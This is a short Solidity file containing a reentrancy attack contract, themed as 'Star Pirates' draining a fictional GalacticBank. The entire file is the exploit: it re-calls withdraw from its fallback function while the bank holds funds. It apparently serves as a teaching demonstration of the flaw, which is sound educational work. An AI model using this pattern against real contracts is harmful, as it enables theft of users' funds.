// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
StarPirateAttack is a contract deployed by the notorious Star Pirates,
aiming to exploit the reentrancy vulnerability in GalacticBank to steal Ether and Galactic Credits.

1. A Star Pirate deploys StarPirateAttack with GalacticBank's address.
2. The pirate initiates the attack, potentially draining resources.
3. The outcome of their endeavor could be affected by unseen security measures.
*/

contract StarPirateAttack {
    GalacticBank public bank;

    constructor(GalacticBank _bank) {
        bank = GalacticBank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
